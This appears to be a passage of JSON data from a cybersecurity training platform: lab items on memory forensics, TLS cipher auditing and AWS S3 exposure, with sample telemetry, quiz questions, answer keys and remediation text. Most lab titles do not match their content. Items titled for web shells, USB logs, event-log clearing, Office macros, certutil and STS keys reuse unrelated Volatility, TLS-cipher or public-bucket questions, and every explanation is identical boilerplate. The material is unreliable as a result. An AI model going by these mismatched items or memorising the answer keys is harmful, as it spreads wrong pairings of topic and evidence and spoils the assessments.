  {
    "id": "lab-ir-008",
    "category": "Incident Response & Malware Forensics",
    "title": "USB Removable Device Tracking via Windows SetupAPI Logs",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 130,
    "briefing": "Digital forensics analysts acquired forensic artifacts following a suspected breach. Examine artifact evidence, verify execution timestamps, and identify adversary tools.",
    "telemetry": "Volatility 3 Framework Analysis:\nWindows.PsList:\n  PID: 4892 | PPID: 1044 | ImageFileName: svchost.exe | Path: C:\\Windows\\Temp\\svchost.exe (ANOMALOUS PATH!)\nWindows.Malfind:\n  Process: svchost.exe PID 4892 | Address: 0x000001f2a000\n  Protection: PAGE_EXECUTE_READWRITE (RWX Memory!)\n  Hex Dump: 4d 5a 90 00 03 00 00 00 ... [MZ Header - Injected Executable]",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What anomalous directory was the counterfeit svchost.exe running from instead of C:\\Windows\\System32?",
        "expected": "C:\\Windows\\Temp",
        "acceptedKeywords": [
          "C:\\Windows\\Temp",
          "Temp"
        ],
        "hint": "Path shown in PsList output.",
        "explanation": "Expected: C:\\Windows\\Temp. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What suspicious memory protection flag (RWX) was detected by the Volatility malfind plugin?",
        "expected": "PAGE_EXECUTE_READWRITE",
        "acceptedKeywords": [
          "PAGE_EXECUTE_READWRITE",
          "RWX"
        ],
        "hint": "Read, Write, and Execute memory permission.",
        "explanation": "Expected: PAGE_EXECUTE_READWRITE. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What famous file magic bytes \"4d 5a\" (MZ) indicate an executable PE header injected into memory?",
        "expected": "MZ",
        "acceptedKeywords": [
          "MZ",
          "PE",
          "Mark Zbikowski"
        ],
        "hint": "Initial two bytes of a Windows binary.",
        "explanation": "Expected: MZ. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What Process ID (PID) was assigned to the malicious injected process?",
        "expected": "4892",
        "acceptedKeywords": [
          "4892"
        ],
        "hint": "PID field in PsList.",
        "explanation": "Expected: 4892. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What open-source memory forensics framework was utilized to perform this analysis?",
        "expected": "Volatility",
        "acceptedKeywords": [
          "Volatility",
          "Volatility 3"
        ],
        "hint": "Standard memory analysis framework.",
        "explanation": "Expected: Volatility. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. In forensic investigations, what mathematical operation proves digital evidence integrity has not changed?",
        "expected": "Cryptographic Hash",
        "acceptedKeywords": [
          "Cryptographic Hash",
          "Hashing",
          "SHA-256",
          "MD5"
        ],
        "hint": "Computing MD5 or SHA-256 checksums.",
        "explanation": "Expected: Cryptographic Hash. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Extract memory dump and disk image, verify chain of custody, dump injected memory range 0x000001f2a000 for static reverse engineering, and update EDR behavioral rules."
  },
  {
    "id": "lab-ir-009",
    "category": "Incident Response & Malware Forensics",
    "title": "Web Shell Incident Response: China Chopper & Weevely Identification",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-ir-010",
    "category": "Incident Response & Malware Forensics",
    "title": "Adversary Anti-Forensics: Event Log Clearing (Event 1102 & wevtutil)",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 120,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-ir-011",
    "category": "Incident Response & Malware Forensics",
    "title": "Browser History & SQLite Forensic Artifacts Extraction",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 130,
    "briefing": "Digital forensics analysts acquired forensic artifacts following a suspected breach. Examine artifact evidence, verify execution timestamps, and identify adversary tools.",
    "telemetry": "Volatility 3 Framework Analysis:\nWindows.PsList:\n  PID: 4892 | PPID: 1044 | ImageFileName: svchost.exe | Path: C:\\Windows\\Temp\\svchost.exe (ANOMALOUS PATH!)\nWindows.Malfind:\n  Process: svchost.exe PID 4892 | Address: 0x000001f2a000\n  Protection: PAGE_EXECUTE_READWRITE (RWX Memory!)\n  Hex Dump: 4d 5a 90 00 03 00 00 00 ... [MZ Header - Injected Executable]",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What anomalous directory was the counterfeit svchost.exe running from instead of C:\\Windows\\System32?",
        "expected": "C:\\Windows\\Temp",
        "acceptedKeywords": [
          "C:\\Windows\\Temp",
          "Temp"
        ],
        "hint": "Path shown in PsList output.",
        "explanation": "Expected: C:\\Windows\\Temp. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What suspicious memory protection flag (RWX) was detected by the Volatility malfind plugin?",
        "expected": "PAGE_EXECUTE_READWRITE",
        "acceptedKeywords": [
          "PAGE_EXECUTE_READWRITE",
          "RWX"
        ],
        "hint": "Read, Write, and Execute memory permission.",
        "explanation": "Expected: PAGE_EXECUTE_READWRITE. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What famous file magic bytes \"4d 5a\" (MZ) indicate an executable PE header injected into memory?",
        "expected": "MZ",
        "acceptedKeywords": [
          "MZ",
          "PE",
          "Mark Zbikowski"
        ],
        "hint": "Initial two bytes of a Windows binary.",
        "explanation": "Expected: MZ. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What Process ID (PID) was assigned to the malicious injected process?",
        "expected": "4892",
        "acceptedKeywords": [
          "4892"
        ],
        "hint": "PID field in PsList.",
        "explanation": "Expected: 4892. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What open-source memory forensics framework was utilized to perform this analysis?",
        "expected": "Volatility",
        "acceptedKeywords": [
          "Volatility",
          "Volatility 3"
        ],
        "hint": "Standard memory analysis framework.",
        "explanation": "Expected: Volatility. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. In forensic investigations, what mathematical operation proves digital evidence integrity has not changed?",
        "expected": "Cryptographic Hash",
        "acceptedKeywords": [
          "Cryptographic Hash",
          "Hashing",
          "SHA-256",
          "MD5"
        ],
        "hint": "Computing MD5 or SHA-256 checksums.",
        "explanation": "Expected: Cryptographic Hash. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Extract memory dump and disk image, verify chain of custody, dump injected memory range 0x000001f2a000 for static reverse engineering, and update EDR behavioral rules."
  },
  {
    "id": "lab-ir-012",
    "category": "Incident Response & Malware Forensics",
    "title": "Linux Volatility Memory Profile Analysis: Concealed Kernel Modules",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 220,
    "briefing": "Digital forensics analysts acquired forensic artifacts following a suspected breach. Examine artifact evidence, verify execution timestamps, and identify adversary tools.",
    "telemetry": "Volatility 3 Framework Analysis:\nWindows.PsList:\n  PID: 4892 | PPID: 1044 | ImageFileName: svchost.exe | Path: C:\\Windows\\Temp\\svchost.exe (ANOMALOUS PATH!)\nWindows.Malfind:\n  Process: svchost.exe PID 4892 | Address: 0x000001f2a000\n  Protection: PAGE_EXECUTE_READWRITE (RWX Memory!)\n  Hex Dump: 4d 5a 90 00 03 00 00 00 ... [MZ Header - Injected Executable]",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What anomalous directory was the counterfeit svchost.exe running from instead of C:\\Windows\\System32?",
        "expected": "C:\\Windows\\Temp",
        "acceptedKeywords": [
          "C:\\Windows\\Temp",
          "Temp"
        ],
        "hint": "Path shown in PsList output.",
        "explanation": "Expected: C:\\Windows\\Temp. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What suspicious memory protection flag (RWX) was detected by the Volatility malfind plugin?",
        "expected": "PAGE_EXECUTE_READWRITE",
        "acceptedKeywords": [
          "PAGE_EXECUTE_READWRITE",
          "RWX"
        ],
        "hint": "Read, Write, and Execute memory permission.",
        "explanation": "Expected: PAGE_EXECUTE_READWRITE. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What famous file magic bytes \"4d 5a\" (MZ) indicate an executable PE header injected into memory?",
        "expected": "MZ",
        "acceptedKeywords": [
          "MZ",
          "PE",
          "Mark Zbikowski"
        ],
        "hint": "Initial two bytes of a Windows binary.",
        "explanation": "Expected: MZ. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What Process ID (PID) was assigned to the malicious injected process?",
        "expected": "4892",
        "acceptedKeywords": [
          "4892"
        ],
        "hint": "PID field in PsList.",
        "explanation": "Expected: 4892. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What open-source memory forensics framework was utilized to perform this analysis?",
        "expected": "Volatility",
        "acceptedKeywords": [
          "Volatility",
          "Volatility 3"
        ],
        "hint": "Standard memory analysis framework.",
        "explanation": "Expected: Volatility. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. In forensic investigations, what mathematical operation proves digital evidence integrity has not changed?",
        "expected": "Cryptographic Hash",
        "acceptedKeywords": [
          "Cryptographic Hash",
          "Hashing",
          "SHA-256",
          "MD5"
        ],
        "hint": "Computing MD5 or SHA-256 checksums.",
        "explanation": "Expected: Cryptographic Hash. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Extract memory dump and disk image, verify chain of custody, dump injected memory range 0x000001f2a000 for static reverse engineering, and update EDR behavioral rules."
  },
  {
    "id": "lab-ir-013",
    "category": "Incident Response & Malware Forensics",
    "title": "Malicious Office Macro VBA Code Extraction & AutoExec De-obfuscation",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Digital forensics analysts acquired forensic artifacts following a suspected breach. Examine artifact evidence, verify execution timestamps, and identify adversary tools.",
    "telemetry": "Volatility 3 Framework Analysis:\nWindows.PsList:\n  PID: 4892 | PPID: 1044 | ImageFileName: svchost.exe | Path: C:\\Windows\\Temp\\svchost.exe (ANOMALOUS PATH!)\nWindows.Malfind:\n  Process: svchost.exe PID 4892 | Address: 0x000001f2a000\n  Protection: PAGE_EXECUTE_READWRITE (RWX Memory!)\n  Hex Dump: 4d 5a 90 00 03 00 00 00 ... [MZ Header - Injected Executable]",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What anomalous directory was the counterfeit svchost.exe running from instead of C:\\Windows\\System32?",
        "expected": "C:\\Windows\\Temp",
        "acceptedKeywords": [
          "C:\\Windows\\Temp",
          "Temp"
        ],
        "hint": "Path shown in PsList output.",
        "explanation": "Expected: C:\\Windows\\Temp. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What suspicious memory protection flag (RWX) was detected by the Volatility malfind plugin?",
        "expected": "PAGE_EXECUTE_READWRITE",
        "acceptedKeywords": [
          "PAGE_EXECUTE_READWRITE",
          "RWX"
        ],
        "hint": "Read, Write, and Execute memory permission.",
        "explanation": "Expected: PAGE_EXECUTE_READWRITE. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What famous file magic bytes \"4d 5a\" (MZ) indicate an executable PE header injected into memory?",
        "expected": "MZ",
        "acceptedKeywords": [
          "MZ",
          "PE",
          "Mark Zbikowski"
        ],
        "hint": "Initial two bytes of a Windows binary.",
        "explanation": "Expected: MZ. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What Process ID (PID) was assigned to the malicious injected process?",
        "expected": "4892",
        "acceptedKeywords": [
          "4892"
        ],
        "hint": "PID field in PsList.",
        "explanation": "Expected: 4892. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What open-source memory forensics framework was utilized to perform this analysis?",
        "expected": "Volatility",
        "acceptedKeywords": [
          "Volatility",
          "Volatility 3"
        ],
        "hint": "Standard memory analysis framework.",
        "explanation": "Expected: Volatility. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. In forensic investigations, what mathematical operation proves digital evidence integrity has not changed?",
        "expected": "Cryptographic Hash",
        "acceptedKeywords": [
          "Cryptographic Hash",
          "Hashing",
          "SHA-256",
          "MD5"
        ],
        "hint": "Computing MD5 or SHA-256 checksums.",
        "explanation": "Expected: Cryptographic Hash. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Extract memory dump and disk image, verify chain of custody, dump injected memory range 0x000001f2a000 for static reverse engineering, and update EDR behavioral rules."
  },
  {
    "id": "lab-ir-014",
    "category": "Incident Response & Malware Forensics",
    "title": "Certutil.exe Living-Off-The-Land Decoding & Payload Extraction",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 130,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cld-001",
    "category": "Cloud Security & IAM Defense",
    "title": "AWS S3 Bucket Public Exposure & Access Control List Hardening",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "Cloud security posture management detected a misconfigured resource in the tactical cloud tenancy. Audit IAM permissions, identify exposure vectors, and enforce cloud least-privilege standards.",
    "telemetry": "AWS CloudTrail Event:\neventName: PutBucketPolicy\nuserIdentity: { type: \"IAMUser\", userName: \"dev-cadet\", arn: \"arn:aws:iam::123456789012:user/dev-cadet\" }\nrequestParameters: {\n  bucketName: \"tactical-telemetry-archive\",\n  BucketPolicy: {\n    \"Statement\": [{\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::tactical-telemetry-archive/*\"\n    }]\n  }\n}",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What IAM user applied the insecure bucket policy?",
        "expected": "dev-cadet",
        "acceptedKeywords": [
          "dev-cadet"
        ],
        "hint": "userName in userIdentity block.",
        "explanation": "Expected: dev-cadet. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What wildcard character in \"Principal\": \"*\" opens the bucket to everyone on the public internet?",
        "expected": "*",
        "acceptedKeywords": [
          "*",
          "asterisk",
          "wildcard"
        ],
        "hint": "Wildcard symbol.",
        "explanation": "Expected: *. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What S3 action permission was granted to anonymous public users?",
        "expected": "s3:GetObject",
        "acceptedKeywords": [
          "s3:GetObject",
          "GetObject"
        ],
        "hint": "Action field in statement.",
        "explanation": "Expected: s3:GetObject. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What AWS S3 feature should be enabled at the account level to override and prevent public policies?",
        "expected": "S3 Block Public Access",
        "acceptedKeywords": [
          "S3 Block Public Access",
          "Block Public Access"
        ],
        "hint": "Core S3 security control.",
        "explanation": "Expected: S3 Block Public Access. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What security logging service recorded this administrative PutBucketPolicy event?",
        "expected": "AWS CloudTrail",
        "acceptedKeywords": [
          "AWS CloudTrail",
          "CloudTrail"
        ],
        "hint": "AWS API audit logging service.",
        "explanation": "Expected: AWS CloudTrail. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What foundational cybersecurity principle restricts user capabilities to only what is required for their job?",
        "expected": "Least Privilege",
        "acceptedKeywords": [
          "Least Privilege",
          "Principle of Least Privilege",
          "PoLP"
        ],
        "hint": "Core access control doctrine.",
        "explanation": "Expected: Least Privilege. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Enable S3 Block Public Access immediately on tactical-telemetry-archive, remove wildcard policy, and restrict dev-cadet permissions using Service Control Policies (SCPs)."
  },
  {
    "id": "lab-cld-002",
    "category": "Cloud Security & IAM Defense",
    "title": "AWS IAM Wildcard Administrative Policy Remediation & Least Privilege",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Cloud security posture management detected a misconfigured resource in the tactical cloud tenancy. Audit IAM permissions, identify exposure vectors, and enforce cloud least-privilege standards.",
    "telemetry": "AWS CloudTrail Event:\neventName: PutBucketPolicy\nuserIdentity: { type: \"IAMUser\", userName: \"dev-cadet\", arn: \"arn:aws:iam::123456789012:user/dev-cadet\" }\nrequestParameters: {\n  bucketName: \"tactical-telemetry-archive\",\n  BucketPolicy: {\n    \"Statement\": [{\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::tactical-telemetry-archive/*\"\n    }]\n  }\n}",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What IAM user applied the insecure bucket policy?",
        "expected": "dev-cadet",
        "acceptedKeywords": [
          "dev-cadet"
        ],
        "hint": "userName in userIdentity block.",
        "explanation": "Expected: dev-cadet. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What wildcard character in \"Principal\": \"*\" opens the bucket to everyone on the public internet?",
        "expected": "*",
        "acceptedKeywords": [
          "*",
          "asterisk",
          "wildcard"
        ],
        "hint": "Wildcard symbol.",
        "explanation": "Expected: *. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What S3 action permission was granted to anonymous public users?",
        "expected": "s3:GetObject",
        "acceptedKeywords": [
          "s3:GetObject",
          "GetObject"
        ],
        "hint": "Action field in statement.",
        "explanation": "Expected: s3:GetObject. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What AWS S3 feature should be enabled at the account level to override and prevent public policies?",
        "expected": "S3 Block Public Access",
        "acceptedKeywords": [
          "S3 Block Public Access",
          "Block Public Access"
        ],
        "hint": "Core S3 security control.",
        "explanation": "Expected: S3 Block Public Access. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What security logging service recorded this administrative PutBucketPolicy event?",
        "expected": "AWS CloudTrail",
        "acceptedKeywords": [
          "AWS CloudTrail",
          "CloudTrail"
        ],
        "hint": "AWS API audit logging service.",
        "explanation": "Expected: AWS CloudTrail. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What foundational cybersecurity principle restricts user capabilities to only what is required for their job?",
        "expected": "Least Privilege",
        "acceptedKeywords": [
          "Least Privilege",
          "Principle of Least Privilege",
          "PoLP"
        ],
        "hint": "Core access control doctrine.",
        "explanation": "Expected: Least Privilege. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Enable S3 Block Public Access immediately on tactical-telemetry-archive, remove wildcard policy, and restrict dev-cadet permissions using Service Control Policies (SCPs)."
  },
  {
    "id": "lab-cld-003",
    "category": "Cloud Security & IAM Defense",
    "title": "AWS CloudTrail Incident Investigation: Compromised Temporary STS Keys",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 170,
    "briefing": "Cloud security posture management detected a misconfigured resource in the tactical cloud tenancy. Audit IAM permissions, identify exposure vectors, and enforce cloud least-privilege standards.",
    "telemetry": "AWS CloudTrail Event:\neventName: PutBucketPolicy\nuserIdentity: { type: \"IAMUser\", userName: \"dev-cadet\", arn: \"arn:aws:iam::123456789012:user/dev-cadet\" }\nrequestParameters: {\n  bucketName: \"tactical-telemetry-archive\",\n  BucketPolicy: {\n    \"Statement\": [{\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::tactical-telemetry-archive/*\"\n    }]\n  }\n}",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What IAM user applied the insecure bucket policy?",
        "expected": "dev-cadet",
        "acceptedKeywords": [
          "dev-cadet"
        ],
        "hint": "userName in userIdentity block.",
        "explanation": "Expected: dev-cadet. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What wildcard character in \"Principal\": \"*\" opens the bucket to everyone on the public internet?",
        "expected": "*",
        "acceptedKeywords": [
          "*",
          "asterisk",
          "wildcard"
        ],
        "hint": "Wildcard symbol.",
        "explanation": "Expected: *. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What S3 action permission was granted to anonymous public users?",
        "expected": "s3:GetObject",
        "acceptedKeywords": [
          "s3:GetObject",
